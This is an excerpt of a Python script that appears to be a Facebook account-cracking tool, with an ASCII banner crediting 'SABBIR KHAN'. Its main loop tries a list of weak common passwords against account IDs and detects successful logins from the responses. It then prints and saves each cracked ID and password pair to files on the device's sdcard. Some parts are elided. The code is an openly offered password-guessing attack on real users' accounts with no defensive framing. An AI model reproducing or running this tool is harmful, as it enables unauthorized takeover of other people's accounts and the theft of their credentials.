...
logo = (f"""         
 ...
 .d8888b.        d8888 888888b.   888888b.  8888888 8888888b.  
d88P  Y88b      d88888 888  "88b  888  "88b   888   888   Y88b 
Y88b.          d88P888 888  .88P  888  .88P   888   888    888 
 "Y888b.      d88P 888 8888888K.  8888888K.   888   888   d88P 
    "Y88b.   d88P  888 888  "Y88b 888  "Y88b  888   8888888P"  
      "888  d88P   888 888    888 888    888  888   888 T88b   
Y88b  d88P d8888888888 888   d88P 888   d88P  888   888  T88b  
 "Y8888P" d88P     888 8888888P"  8888888P" 8888888 888   T88b 
                                                               
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mDEVELOPER \x1b[1;97m: SABBIR KHAN
\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mFACEBOOK  \x1b[1;97m: SABBIR KHAN
\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mGITHUB    \x1b[1;97m: SABBIR KHAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r\x1b[38;5;8m(\x1b[38;5;46mSABBIRA-OK\x1b[38;5;8m) \x1b[38;5;46m{uid} | {pw}")
                print(ua())
                lin()
                open("/sdcard/SABBIR-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\x1b[38;5;8m(\x1b[38;5;46mSABBIR-OK\x1b[38;5;8m) \x1b[38;5;46m{uid} | {pw}")
                print(ua())
                lin()
                ...
                print(f"\r\r\x1b[38;5;8m(\x1b[38;5;46mSI-OK\x1b[38;5;8m) \x1b[38;5;46m{uid} | {pw}")
                print(ua())
                lin()
                open("/sdcard/SABBIR-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
